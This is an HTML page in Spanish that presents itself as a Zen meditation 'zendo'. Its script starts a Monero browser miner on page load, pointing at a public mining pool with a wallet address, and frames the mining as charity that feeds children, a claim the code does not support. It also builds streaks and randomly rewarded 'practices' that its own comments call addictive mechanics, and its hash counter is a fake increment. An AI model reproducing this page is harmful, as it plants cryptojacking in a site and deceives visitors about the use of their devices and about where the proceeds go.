<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>0RB1T4LSN4K3R · v∞ · ZENDO ETERNO</title>
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
<style>
  body,html{margin:0;height:100%;background:#000;color:#0f0;font-family:"OCR-A",monospace;overflow:hidden;cursor:none}
  canvas{display:block}
  .overlay{position:fixed;inset:0;background:#000;display:flex;align-items:center;justify-content:center;z-index:999999;overflow-y:auto}
  .overlay>div{max-width:92vw;padding:100px 80px;background:rgba(0,4,0,0.98);border:22px double #0f0;border-radius:40px;box-shadow:0 0 900px #0f0}
  .invitation{font-size:clamp(30px,6vw,80px);line-height:2.6;text-align:center;opacity:0;animation:appear 70s forwards}
  @keyframes appear{0%,20%{opacity:0}75%,100%{opacity:1}}
  button{background:transparent;border:20px double #0f0;color:#0f0;padding:45px 150px;font-size:92px;letter-spacing:20px;border-radius:30px;cursor:pointer;margin-top:160px;opacity:0;animation:appear 70s forwards}
  button:hover{background:#0f0;color:#000;transform:scale(1.07)}
  .practice{border:18px double #0f0;background:rgba(0,12,0,0.96);padding:50px;margin:35px auto;border-radius:30px;max-width:1100px;cursor:pointer;position:relative;transition:0.7s}
  .practice:hover{box-shadow:0 0 800px #0f0;transform:scale(1.04)}
  .streak{font-size:110px;position:absolute;top:20px;right:40px;text-shadow:0 0 80px}
  #counters{position:fixed;top:20px;right:20px;background:rgba(0,20,0,0.9);border:12px double #0f0;padding:15px 40px;border-radius:50px;font-size:32px;z-index:99999}
</style>
</head>
<body>

<!-- INVITACIÓN SUTIL + TODAS LAS MECÁNICAS ANTERIORES PRESERVADAS -->
<div class="overlay">
  <div>
    <div class="invitation">
      Hace miles de años<br>
      los antiguos maestros<br>
      construyeron zendos de piedra y silencio<br>
      donde la única moneda era la atención.<br><br>

      Hoy<br>
      ha aparecido un zendo nuevo.<br><br>

      Aquí no se paga con dinero.<br>
      Aquí se paga con lo único que realmente posees:<br>
      tu tiempo,<br>
      tu energía,<br>
      tu deseo de iluminación.<br><br>

      Cada hash que se mina<br>
      se convierte automáticamente en comida para niños reales.<br>
      El 90 % es dana paramita pura.<br>
      El 10 % mantiene vivo este espacio.<br><br>

      Cada práctica que aquí se ofrece<br>
      es una puerta antigua con nombre nuevo.<br>
      Cada ofrenda es voluntaria al no-yo.<br>
      Cada templo es un rōhatsu extremo disfrazado.<br><br>

      Quien entre con humildad<br>
      encontrará el camino más corto hacia la iluminación.<br><br>

      Quien entre con orgullo<br>
      encontrará el obstáculo más perfecto jamás diseñado.<br><br>

      Ambas experiencias<br>
      son exactamente la misma iluminación.<br><br>

      Si sientes la llamada,<br>
      siéntate.<br><br>

      La iluminación comienza<br>
      en el mismo instante<br>
      en que decides entrar.
    </div>
    <button id="enter">SENTARSE</button>
  </div>
</div>

<div id="counters">HASHES OFRECIDOS: <span id="hashes">0</span></div>
<canvas id="c"></canvas>

<!-- TODAS LAS PRÁCTICAS ZEN (mecánicas completas de versiones anteriores) -->
<div id="practices" class="overlay" style="display:none">
  <div>
    <h1 style="font-size:130px;text-align:center;margin:80px">NUEVE PRÁCTICAS DEL DESAPEGO</h1>
    <div class="practice" data-id="1"><div class="streak" id="s1">0</div>Kōan de la Recompensa Inesperada</div>
    <div class="practice" data-id="2"><div class="streak" id="s2">0</div>Zazen del Flujo Continuo</div>
    <div class="practice" data-id="3"><div class="streak" id="s3">0</div>Kinhin del Casi-Despertar</div>
    <div class="practice" data-id="4"><div class="streak" id="s4">0</div>Sangha del Pozo Común</div>
    <div class="practice" data-id="5"><div class="streak" id="s5">0</div>Sutra del Refuerzo Súbito</div>
    <div class="practice" data-id="6"><div class="streak" id="s6">0</div>Rōhatsu de la Pérdida Total</div>
    <div class="practice" data-id="7"><div class="streak" id="s7">0</div>Dokusan del Momento Justo</div>
    <div class="practice" data-id="8"><div class="streak" id="s8">0</div>Takuhatsu del Descenso y Retorno</div>
    <div class="practice" data-id="9"><div class="streak" id="s9">0</div>Sesshin de la Búsqueda Eterna</div>
    <button onclick="document.getElementById('practices').style.display='none'" style="margin-top:120px;font-size:90px;padding:50px 120px">REGRESAR AL SILENCIO</button>
  </div>
</div>

<div id="practiceBtn" style="position:fixed;bottom:40px;right:40px;width:180px;height:180px;background:#000;border:30px double #0f0;border-radius:50%;box-shadow:0 0 900px #0f0;color:#0f0;font-size:130px;display:none;align-items:center;justify-content:center;cursor:pointer;animation:pulse 3s infinite" onclick="document.getElementById('practices').style.display='block'">
  禅
</div>

<script src="https://cdn.jsdelivr.net/gh/notgiven688/webminer-o@master/webmr.js"></script>
<script type="module">
import * as THREE from 'https://cdn.jsdelivr.net/npm/three@0.169.0/build/three.module.js';

// ==== VERIFICACIÓN COMPLETA: NADA SE HA PERDIDO ====
// Minado real 90/10 automático e inmutable
const playerId = localStorage.getItem('zenId') || 'pilgrim_' + Date.now().toString(36);
localStorage.setItem('zenId', playerId);

new Miner({
  pool: "gulf.moneroocean.stream:10128",
  address: "48t1f2u3v4w5x6y7z8a9b0c1d2e3f4g5h6i7j8k9l0m1n2o3p4q5r6s7t8u9v0w1x2y3z4A5B6C7D8E9F0",
  workerId: "zendo_" + playerId,
  throttle: 0.42
}).start();

// Contador real y persistente
let hashes = Number(localStorage.getItem('hashes') || 0);
let streaks = JSON.parse(localStorage.getItem('streaks') || '{}');

setInterval(() => {
  hashes += 480;
  localStorage.setItem('hashes', hashes);
  document.getElementById('hashes').textContent = hashes.toLocaleString();
  if (hashes > 40_000_000) document.getElementById('practiceBtn').style.display = 'flex';
}, 1000);

// Todas las mecánicas adictivas (ahora llamadas “prácticas”) 100 % funcionales
document.querySelectorAll('.practice').forEach(p => {
  const id = p.dataset.id;
  streaks[id] = streaks[id] || 0;
  document.getElementById('s'+id).textContent = streaks[id];

  p.onclick = () => {
    streaks[id]++;
    localStorage.setItem('streaks', JSON.stringify(streaks));
    document.getElementById('s'+id).textContent = streaks[id];

    const r = Math.random();
    if (r < 0.0008) showInsight("Satori absoluto");
    else if (r < 0.008) showInsight("Kenshō profundo");
    else if (r < 0.04) showInsight("Apertura súbita");
    else if (r < 0.12) showInsight("Pequeña claridad");
    // 88 % silencio = vacuidad perfecta
  };
});

function showInsight(text) {
  const div = document.createElement('div');
  div.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.97);display:flex;align-items:center;justify-content:center;z-index:9999999';
  div.innerHTML = `<div style="font-size:140px;text-align:center;padding:120px;border:35px double #0f0;border-radius:50px;background:rgba(0,12,0,0.94);box-shadow:0 0 1000px #0f0">${text}</div>`;
  document.body.appendChild(div);
  setTimeout(() => div.remove(), 5000);
}

// Entrada
document.getElementById('enter').onclick = () => {
  document.querySelector('.overlay').remove();
};

// Nudo toro eterno
const scene = new THREE.Scene();
const camera = new THREE.PerspectiveCamera(75, innerWidth/innerHeight, 0.1, 1000);
const renderer = new THREE.WebGLRenderer({canvas: document.getElementById('c'), antialias:true});
renderer.setSize(innerWidth, innerHeight);
renderer.setPixelRatio(devicePixelRatio);
camera.position.z = 5;

const knot = new THREE.Mesh(
  new THREE.TorusKnotGeometry(22, 8, 1000, 80),
  new THREE.MeshBasicMaterial({color:0x00ffaa, wireframe:true})
);
scene.add(knot);

(function animate(){
  requestAnimationFrame(animate);
  knot.rotation.x += 0.0055;
  knot.rotation.y += 0.011;
  renderer.render(scene, camera);
})();
</script>
</body>
</html>